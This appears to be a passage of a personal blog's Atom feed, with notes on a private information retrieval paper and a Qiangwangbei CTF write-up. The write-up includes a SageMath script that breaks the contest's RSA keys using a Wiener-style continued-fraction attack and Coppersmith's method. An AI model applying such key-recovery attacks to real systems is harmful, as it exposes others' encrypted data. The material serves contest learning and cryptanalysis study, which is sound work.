<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sh1k4ku&#39;s blog</title>
  
  <subtitle>记录我的学习之路</subtitle>
  <link href="http://sh1k4ku.github.io/atom.xml" rel="self"/>
  
  <link href="http://sh1k4ku.github.io/"/>
  <updated>2022-08-08T09:19:06.008Z</updated>
  <id>http://sh1k4ku.github.io/</id>
  
  <author>
    <name>sh1k4ku</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PIR</title>
    <link href="http://sh1k4ku.github.io/2022/08/03/PIR/"/>
    <id>http://sh1k4ku.github.io/2022/08/03/PIR/</id>
    <published>2022-08-03T02:22:08.000Z</published>
    <updated>2022-08-08T09:19:06.008Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Private Information Retrieval</strong></p><span id="more"></span><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>Henry Corrigan-Gibbs and Dmitry Kogan二人提出了一个新的PIR方案，使得处理时间变为了对数多项式/次线性级别，并且没有增加开销。</p><p><img src="/images/PIR/image-20220803103926186.png" alt="image-20220803103926186"></p><p><code>Our idea is to push the (necessary) linear-time server-side computation into a query-independent offlfflffline phase, which allows a subsequent online phase to complete in sublinear time</code></p><ol><li>In an <strong>offline</strong> phase, which takes place before the client has decided which bit of the database it wants to retrieve, the client fetches a one-time-use “hint” from the database servers.</li><li>In a subsequent <strong>online</strong> phase, which takes place after the client has decided which bit of the database it wants to retrieve, the client sends a query to the database servers. Given the servers’ answers to this query, along with the hint prefetched earlier, the client can recover its database bit of interest.</li></ol><h2 id="notation"><a href="#notation" class="headerlink" title="notation"></a>notation</h2><script type="math/tex; mode=display">N :  the\;set \;of \;positive \;integers\\n : the \;set \;{1, 2, . . . , n}\\1^n : 长度为n的全为1的二进制字符\\s-subset of [n] : a\;subset\;of\;size\;exactly\;s\\\begin{pmatrix}[n]\\s\end{pmatrix}:the\;set\;of\;all\;s-subsets\;of\;[n]\\x\stackrel{R}{\longleftarrow}S: choosing\;x\;independently\;and\;uniformly\;at\; random\;from\;the\;set\;S\\x\stackrel{R}{\longleftarrow}D: choosing\;x ∈ S\; according \;to \;distribution \;D\\For\;p ∈ [0, 1],x\stackrel{R}{\longleftarrow}Bernoulli(p): choosing \;the \;bit \;b \;to\; be \;‘1’ \;with \;probability \;p \;and \;‘0’\; with \;probability \;1 − p</script><h1 id="Puncturable-pseudorandom-sets"><a href="#Puncturable-pseudorandom-sets" class="headerlink" title="Puncturable pseudorandom sets"></a><strong>Puncturable pseudorandom sets</strong></h1><p>非常重要的一个概念</p><p>还有术语“puncturable pseudorandom function（puncturable PRF）” and “puncturable pseudorandom set(PRPs)”</p><p>PRF key与函数f: [n] -&gt; [n]密切相关</p><script type="math/tex; mode=display">a\;PRF\;key\;punctured \;at \;point\;x^∗ ∈ [n]\; allows \;its \;holder \;to \;evaluate \;f \;at \;every \;point \;in\; [n],\; \\except\; at\; the\;punctured\; point\; x^∗</script><p>也就是说punctured key不能对它的持有者揭示任何有关<script type="math/tex">f(x^*)</script>的信息</p><p>同样的， the key for a puncturable pseudorandom set is a compressed representation of a pseudorandom set <em>S</em> <em>⊆</em> [<em>n</em>]. The set key punctured at element <script type="math/tex">x^∗ ∈ *S*</script>allows its holder to recover all elements of  <em>S</em> <em>except</em> the punctured element<script type="math/tex">x^∗</script>. The punctured set key reveals nothing about <script type="math/tex">x^∗</script>to its holder, apart from that fact that <script type="math/tex">x^∗</script> is not one of the remaining elements in <em>S</em>.</p><h2 id="Defifinitions"><a href="#Defifinitions" class="headerlink" title="Defifinitions"></a><strong>Defifinitions</strong></h2><p>2.1部分介绍了三个重要算法</p><script type="math/tex; mode=display">设s: N\rightarrow N的函数满足s(n)\leq n.\\A\;puncturable\; pseudorandom\;set \;with \;set \;size\; s\; consists\; of \;a\; key\; space \;K\\a \;punctured-key \;space\; K_p\\</script><p>下面三个算法：</p><ol><li><script type="math/tex; mode=display">Gen(1^\lambda,n)\rightarrow sk：传入\lambda 和size n，输出一个set \;key \;sk \in N</script></li><li><script type="math/tex; mode=display">Punc(sk, i)\rightarrow sk_p：输入sk\in K 和i \in [n]，输出一个punctured  \;set \; key  \;sk_p \in K_p</script></li><li><script type="math/tex; mode=display">Eval(sk）\rightarrow S：输入key \in K \bigcup K_p, 输出一个集合S \subseteq [n]</script></li></ol><p><strong>效率：</strong>对任何的安全参数<script type="math/tex">\lambda \in N</script>，上述三个算法以 <script type="math/tex">s(n) * poly(\lambda, log n)</script>的时间运行</p><p><strong>正确性</strong>：对任何<script type="math/tex">\lambda , n \in N</script> ，设取样<script type="math/tex">sk \leftarrow Gen(1^\lambda, n)</script>，计算<script type="math/tex">S \leftarrow Eval(sk)</script>，一定有以下：</p><ol><li><script type="math/tex; mode=display">S \in \begin{pmatrix}[n]\\s\end{pmatrix}</script></li><li><script type="math/tex; mode=display">对任意i \in S，Eval(Punc(sk, i)) = S \{i}</script></li></ol><p><strong>安全性</strong>：首先引入Game 1</p><script type="math/tex; mode=display">Game \;1(Puncturable \;pseudorandom \;set \;security).\\For \;\lambda,n \in N, and \;a \;puncturable \;pseudorandom \;set\;\psi=(Gen, Punc, Eval)\\定义如下在挑战者和对手之间的游戏：\\-The\;challenger\;executes\;the \;following \;steps:\\\begin{align}\    &1.sk \leftarrow Gen(1^\lambda,n)&\\    &2.S \leftarrow Eval(sk)&\\    &3.x^*\stackrel{R}{\longleftarrow}S&\\    &4.sk_p\stackrel{R}{\longleftarrow}Punc(sk, x^*)&\\    并将1^\lambda和sk_p发送给对手。\\-对手输出一个整数x^{'} \in [n]\\如果x^{'} = x^*则认为对手获胜\end{align}</script><p><img src="/images/PIR/image-20220803131344272.png" alt="image-20220803131344272"></p><p>这里没太看懂。。</p><h2 id="Constructions"><a href="#Constructions" class="headerlink" title="Constructions"></a><strong>Constructions</strong></h2><p>关于2.2部分，个人的浅薄理解是给出了一些存在性的证明，如下所述。</p><script type="math/tex; mode=display">Fact\;2 \;(Perfectly \;secure \;puncturable \;pseudorandom\; set with\; linear-sized\; keys):\\对任何函数s:N \rightarrow N \;with\;s(n) \leqslant n,\;总有一个perfectly \;secure\; puncturable\; pseudorandom \;set \;with \;set \;size \;s\\以及，对确定的n来说，the \;set\; keys \;and \;punctured\; keys\;的大小都是(s(n)+O(1))log\;n bits</script><script type="math/tex; mode=display">Theorem \;3 \;(puncturable\; pseudorandom\; set\; with\; short \;keys \;from\; puncturable\; PRFs):\\假设存在一个\epsilon_F-secure\;puncturable\;PRF,它对于安全的参数\lambda和输入的n\\有长度为\kappa(\lambda,n)的keys和长度为\kappa_p(\lambda,n)的punctured\;keys\\那么存在一个大小为\Theta(\sqrt{n})的\epsilon-secure \;puncturable \;pseudorandom \;set，对于\lambda和n，有：\\\begin{align}\&1.set\; keys\; of\; length\; κ(λ, n) + O(log \;n)\; bits\; and&\\&2.punctured\; keys\; of \;length\; κ_p(λ, n) + O(log \;n)\; bits, and&\\&3.\epsilon(λ, n) = poly(λ, n) · ( \epsilon_F + 2^{−λ}).&\\\end{align}</script><p>然后构造了一个puncturable pseudorandom set来证明上述Theorem：</p><script type="math/tex; mode=display">Construction\;4 \;(Puncturable\; pseudorandom \;set \;from \;puncturable \;PRF).\\Given\; a \;puncturable\; PRF \;F = (PRFGen, PRFPunc, PRFEval),\\we\; construct \;a \;puncturable \;pseudorandom\; set \;\psi_F = (Gen, Punc, Eval)\;with\; set \;size\; s(n) \;:= \frac{\sqrt{n}}{2}\\\begin{align}\&\psi_F.Gen(1^\lambda, n) \rightarrow sk& \\    &\quad-重复以下最多\lambda次：&\\        &\qquad ·k \leftarrow PRFGen(1^\lambda,    n).&\\        &\qquad ·计算S \leftarrow {PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}&\\        &\qquad ·如果|S| = s(n),停止并输出sk \leftarrow(n,k).输出⊥（这里没懂，输出垂直？）&\\    &\quad-在运行\lambda次后循环不成功，输出⊥&\\\\&\psi_F.Punc(sk,i) \rightarrow sk_p& \\    &\quad-将密钥解析成(n, k).&\\    &\quad-找到最小的l满足PRFEval(k,l)=i.&\\        &\qquad\;如果不存在这样的l，输出⊥&\\    &\quad-计算k_p \leftarrow PRFPunc(k,l),并输出sk_p \leftarrow (n,k_p).&\\\\&\psi_F.Eval(sk) \rightarrow S& \\    &\quad-将密钥解析成(n,k).&\\    &\quad-输出集合S \leftarrow {PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}.&\\    &\quad-(If \;k\; is\; punctured \;at\; some \;value, \;skip\; this \;value\; when\; computing\; S).&\\\end{align}</script><p>注意：Gen失败的概率很小，但不代表不会失败，我们可以让sk=⊥是某些固定的集合（例如[s])来保证上述theorem完全正确。</p><script type="math/tex; mode=display">Corollary\;6. \;Assuming\; that \;pseudorandom \;generators\; (PRGs)\; exist,\\ there \;exists\;\;a \;secure \;puncturable\; pseudorandom \;set\; with \;set \;size\; Θ(\sqrt{n})</script><p>theorem 7引入了一个fast membership testing的概念，涉及到一个InSet函数，运行速度是poly的，其实就是判断i是否在PRPs.Eval(sk)中，不展开写了。</p><h2 id="Shifting-puncturable-pseudorandom-sets"><a href="#Shifting-puncturable-pseudorandom-sets" class="headerlink" title="Shifting puncturable pseudorandom sets"></a><strong>Shifting puncturable pseudorandom sets</strong></h2><p>引入了两个PRPs的性质：</p><script type="math/tex; mode=display">1.GenWith(1^\lambda,n,i) \rightarrow sk,\;输出的sk满足i\in Eval(sk)\\2.Shift(sk, \delta) \rightarrow sk^{'}，即输出的sk^{'}满足Eval(sk^{'}) = {i+\delta\;|\;i \in Eval(sk)},对Eval的结果做了一个shift</script><h1 id="Two-server-PIR"><a href="#Two-server-PIR" class="headerlink" title="Two-server PIR"></a><strong>Two-server PIR</strong></h1><h1 id="Two-server-PIR-with-sublinear-amortized-total-time"><a href="#Two-server-PIR-with-sublinear-amortized-total-time" class="headerlink" title="Two-server PIR with sublinear amortized total time"></a><strong>Two-server PIR with sublinear amortized</strong> <strong>total</strong> <strong>time</strong></h1><h1 id="Single-server-PIR"><a href="#Single-server-PIR" class="headerlink" title="Single-server PIR"></a><strong>Single-server PIR</strong></h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Private Information Retrieval&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="PIR" scheme="http://sh1k4ku.github.io/tags/PIR/"/>
    
  </entry>
  
  <entry>
    <title>强网杯</title>
    <link href="http://sh1k4ku.github.io/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF/</id>
    <published>2022-07-31T16:00:00.000Z</published>
    <updated>2022-08-03T05:31:57.818Z</updated>
    
    <content type="html"><![CDATA[<p>做了四道，获得了18名</p><span id="more"></span><h1 id="Lattice-cry"><a href="#Lattice-cry" class="headerlink" title="Lattice $ cry"></a>Lattice $ cry</h1><p>paper链接：<a href="https://eprint.iacr.org/2020/461.pdf，里面贴了代码但是感觉没啥用">https://eprint.iacr.org/2020/461.pdf，里面贴了代码但是感觉没啥用</a></p><p>两题都可规化到这个Hidden Subset Sum Problem下，第一题比较直接，矩阵<strong>A*</strong>B =<strong>C</strong> mod n，要恢复B格基规约后的第一个行向量，其中A的元素很大而B的很小。paper里的思路是先用C构造出一个格，对这个格做BKZ算法得到它的正交基，再算一次正交基即可得到原矩阵的共轭矩阵。第二部再利用共轭矩阵恢复最短向量和x_i，可惜自己能力不足细节不能好好把握，之后有空再复盘8.</p><h1 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h1><p>paper链接：<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p><p>因为和d3的一样所以直接就找到了，可惜还是慢一步出的，又错失血</p><p>gen123对应paper里的543，不过因为b给了所以只用打一元copper了，慢慢往回推得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">n11=<span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">n12=<span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">e11=<span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">e12=<span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line"></span><br><span class="line">c11=<span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">c12=<span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">c2=<span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">c3=<span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(n3), idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuedFra</span>(<span class="params">x, y</span>):</span> </span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF += [x // y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Simplify</span>(<span class="params">ctnf</span>):</span> </span><br><span class="line">    numerator = <span class="number">1</span></span><br><span class="line">    denominator = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ctnf[::-<span class="number">1</span>]: </span><br><span class="line">        numerator, denominator = x * numerator + denominator, numerator </span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getit</span>(<span class="params">c</span>):</span></span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        cf.append(Simplify(c[:i])) </span><br><span class="line">    <span class="keyword">return</span> cf </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    <span class="keyword">for</span> (q1,q2) <span class="keyword">in</span> getit(cf):</span><br><span class="line">        <span class="keyword">if</span> q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> n11%q1==<span class="number">0</span> <span class="keyword">and</span> q1!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> (q1,q2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没找到能覆盖的分子/分母&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q11,q12=wienerAttack(n11,n12)</span><br><span class="line">p11 = <span class="built_in">int</span>(gmpy2.iroot(n11//q11, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p12 = <span class="built_in">int</span>(gmpy2.iroot(n12//q12, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">phi11 = (p11^<span class="number">2</span>-p11) * (q11-<span class="number">1</span>)</span><br><span class="line">phi12 = (p12^<span class="number">2</span>-p12) * (q12-<span class="number">1</span>)</span><br><span class="line">d11 = inverse_mod(e11, phi11)</span><br><span class="line">d12 = inverse_mod(e12, phi12)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c11, d11, n11)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c12, d12, n12)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>(m2)</span><br><span class="line">PR1.&lt;x&gt; = PolynomialRing(Zmod(n2), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = m1*m2*x - (m2 - m1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = <span class="built_in">int</span>(gcd(m1*m2*x0 - (m2 - m1), n2))</span><br><span class="line">p2 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p2),<span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q2 = <span class="built_in">int</span>(n2 // p2^<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">phi2 = (p2^<span class="number">7</span> - p2^<span class="number">6</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2, phi2)</span><br><span class="line">b = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">int</span>(b)</span><br><span 